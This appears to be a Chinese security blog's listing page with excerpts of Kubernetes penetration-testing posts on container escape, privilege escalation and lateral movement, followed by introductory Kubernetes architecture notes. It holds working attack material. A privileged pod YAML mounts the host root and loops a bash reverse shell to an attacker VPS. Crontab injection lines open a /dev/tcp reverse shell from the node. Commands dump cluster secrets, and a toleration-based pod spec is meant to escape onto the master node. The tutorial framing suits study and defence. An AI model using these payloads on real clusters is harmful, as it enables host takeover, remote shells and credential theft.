</span></span><span style="display:flex;"><span>  <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">test-rev</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">nodeName</span>: <span style="color:#ae81ff">&lt;节点名称&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-container</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">ubuntu</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">args</span>:
</span></span><span style="display:flex;"><span>          - <span style="color:#e6db74">&#34;-c&#34;</span>
</span></span><span style="display:flex;"><span>          - |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            apt update &amp;&amp; apt install -y bash netcat-openbsd &amp;&amp; \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            bash -c &#39;while true; do bash -i &gt;&amp; /dev/tcp/&lt;你的vps的公网IP&gt;/2333 0&gt;&amp;1; sleep 60; done&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/mnt</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">securityContext</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">test-volume</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">hostPath</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
</span></span></code></pre></div><p>指定yaml文件即可创建：</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">K8s渗透-权限提升</a></h2>
      <h1 id="k8s渗透-权限提升">K8s渗透-权限提升</h1>
<blockquote>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
</blockquote>
<p>一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。</p>
<h2 id="rbac权限滥用">RBAC权限滥用</h2>
<p>类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务</p>
<h2 id="部署静态pod">部署静态pod</h2>
<p>这个方法在我的<a href="https://www.cnblogs.com/yuy0ung/articles/19076992">k8s渗透-持久化</a>的笔记中已经介绍过了，这里不再赘述</p>
<h2 id="利用容器不安全配置提权">利用容器不安全配置提权</h2>
<p>即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别</p>
<h3 id="挂载目录逃逸">挂载目录逃逸</h3>
<p>挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接看我的这篇文章：<a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a>，这里提一个最简单的挂载根目录：</p>
<p>比如我们创建恶意pod的时候，根目录挂载到了容器的<code>/mnt</code>目录，所以在获取了pod的shell后，我们可以通过查看pod的<code>/mnt</code>目录来访问查看node的根目录：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714003958889.png" alt="QQ_1752337790318"></p>
<p>接下来可以通过写定时任务来获取node的shell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;* * * * * root /bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/&lt;vps的公网IP&gt;/4444 0&gt;&amp;1 &amp; disown  &#39;&#34;</span> &gt;&gt; /mnt/etc/crontab
</span></span></code></pre></div><blockquote>
<p>注意，这里并没有直接使用<code>sh -i &gt; /dev/tcp/&lt;IP&gt;/4444 2&gt;&amp;1</code>，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持<code>&gt;&amp;</code>语法，上面的yaml文件中反弹shell的payload同理</p>
</blockquote>
<p>我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384892469.png" alt="QQ_1752384892469"></p>
<p>这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作：
<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752342324537-20250714004016922.png" alt="QQ_1752342324537"></p>
<p>不过通过查阅资料发现原因可能和busybox的情况类似，对<code>-i</code>即交互参数支持不完整，那么我们可以尝试使用<code>disown</code>命令让我们反弹shell的进程不受父shell进程影响而exit：</p>
<pre tabindex="0"><code>echo -e &#34;* * * * * root /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1 &amp; disown&#39;&#34; &gt;&gt; /mnt/etc/crontab
</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384977729.png" alt="QQ_1752384977729"></p>
<p>此时我们就可以接收到反弹的shell并且不会断开了：
<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752344803661-20250714004017953.png" alt="QQ_1752344803661"></p>
<h3 id="持久化挂载dockersock">持久化挂载docker.sock</h3>
<p>挂载docker socket逃逸同样在我写的 <a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a> 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">k8s渗透-横向移动</a></h2>
      <h1 id="k8s渗透-横向移动">k8s渗透-横向移动</h1>
<h2 id="窃取凭证">窃取凭证</h2>
<h3 id="kubeconfig凭证">kubeconfig凭证</h3>
<p>kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在我的 <a href="https://www.cnblogs.com/yuy0ung/articles/19031290">k8s渗透-初始访问</a> 笔记中已经介绍了，这里不再说明</p>
<h3 id="secret对象">secret对象</h3>
<p>在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubeconfig get secrets -A
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151099118.png" alt="QQ_1757151099118"></p>
<p>查看指定secret内容：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kubectl --kubeconfig config -n <span style="color:#f92672">[</span>指定命名空间<span style="color:#f92672">]</span> get secret <span style="color:#f92672">[</span>secret名称<span style="color:#f92672">]</span> -o yaml
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151463832.png" alt="QQ_1757151463832"></p>
<p>可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了</p>
<h2 id="集群内网渗透">集群内网渗透</h2>
<p>K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段</p>
<h2 id="第三方组件风险">第三方组件风险</h2>
<p>在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸</p>
<p>简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群</p>
<h2 id="污点taint横向">污点（taint）横向</h2>
<p>这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限</p>
<p>污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上</p>
<p>其中污点有三种属性(效果)：</p>
<blockquote>
<ol>
<li><strong>NoSchedule</strong>：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。</li>
<li><strong>PreferNoSchedule</strong>：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 <code>PreferNoSchedule</code> 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。</li>
<li><strong>NoExecute</strong>：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，<code>NoExecute</code> 污点会导致 Pod 被终止并迁移到其他节点。</li>
</ol>
</blockquote>
<p>一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点</p>
<p>比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat &gt; x.yaml <span style="color:#e6db74">&lt;&lt; EOF
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: control-master-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  tolerations:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - key: &#34;node-role.kubernetes.io/master&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    operator: &#34;Exists&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    effect: &#34;NoSchedule&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: control-master-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    image: ubuntu:18.04
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    command: [&#34;/bin/sleep&#34;, &#34;3650d&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    volumeMounts:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: master
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      mountPath: /master
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  volumes:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: master
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hostPath:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      path: /
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      type: Directory
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span></code></pre></div><p>这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">K8s渗透入门从零到一</a></h2>
      <h1 id="k8s渗透从0到1">K8s渗透从0到1</h1>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
<h2 id="k8s基础">k8s基础</h2>
<h3 id="k8s架构">k8s架构</h3>
<p>Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台</p>
<p>k8s基本架构如下（图片的scheduler打错了，特此更正）：
<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752397186606.png" alt="QQ_1752397186606"></p>
<p>从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点</p>
<p><strong>master节点</strong>主要有以下核心组件：</p>
<ul>
<li>etcd 保存了整个集群的状态</li>
<li>API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制</li>
<li>Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等</li>
<li>Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上</li>
</ul>
<p><strong>node节点</strong>有以下核心组件：</p>
<ul>
<li>
<p>Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份</p>
</li>
<li>
<p>Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等</p>
</li>
<li>
<p>Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡</p>
</li>
<li>
<p>pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod</p>
</li>
<li>
<p>fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。</p>
</li>
</ul>
<p>Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源</p>
<p>这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250713220938432.png" alt="image-20250713220938432"></p>
<h3 id="k8s特点">k8s特点</h3>
<p>和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理</p>
<p>k8s具有如下的特点：</p>
<ul>
<li>
<p>自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启</p>
</li>
<li>
<p>弹性伸缩：容器数量的控制</p>
</li>
<li>
<p>自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新</p>
</li>
<li>
<p>服务发现和负载均衡：默认方案</p>
</li>
<li>
<p>机密和配置管理：对敏感数据或其他进行配置管理</p>
</li>
<li>
<p>存储编排：虚拟磁盘与物理磁盘</p>
</li>
<li>
<p>批处理：批量任务实现</p>
</li>
</ul>
<h3 id="k8s工作流程">k8s工作流程</h3>
<blockquote>
<p>kubectl 是 k8s 的客户端工具，可以使用命令行管理集群</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/kubernetes%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">Kubernetes安全基础</a></h2>
      <h1 id="kubernetes安全基础">Kubernetes安全基础</h1>
<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
<h2 id="k8s基础">k8s基础</h2>
<h3 id="k8s架构">k8s架构</h3>
<p>Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台</p>
<p>k8s基本架构如下：
<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752397186606.png" alt="QQ_1752397186606"></p>
<p>从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点</p>
<p><strong>master节点</strong>主要有以下核心组件：</p>
<ul>
<li>etcd 保存了整个集群的状态</li>
<li>API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制</li>
<li>Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等</li>
<li>Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上</li>
</ul>
<p><strong>node节点</strong>有以下核心组件：</p>
<ul>
<li>
<p>Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份</p>
</li>
<li>
<p>Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等</p>
</li>
<li>
<p>Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡</p>
</li>
<li>
<p>pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod</p>
</li>
<li>
<p>fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。</p>
</li>
</ul>
<p>Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源</p>
<p>这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器</p>
<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250713220938432.png" alt="image-20250713220938432"></p>
<h3 id="k8s特点">k8s特点</h3>
<p>和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理</p>
<p>k8s具有如下的特点：</p>
<ul>
<li>
<p>自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启</p>
</li>
<li>
<p>弹性伸缩：容器数量的控制</p>
</li>
<li>
<p>自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新</p>
</li>
<li>
<p>服务发现和负载均衡：默认方案</p>
</li>
<li>
<p>机密和配置管理：对敏感数据或其他进行配置管理</p>
</li>
<li>
<p>存储编排：虚拟磁盘与物理磁盘</p>
</li>
<li>
<p>批处理：批量任务实现</p>
</li>
</ul>
<h3 id="k8s工作流程">k8s工作流程</h3>
<blockquote>
<p>kubectl 是 k8s 的客户端工具，可以使用命令行管理集群</p>
    </section>
  

  </main>
  <footer>
    <p>Copyright 2025. All rights reserved.</p>

  </footer>
</body>
</html>
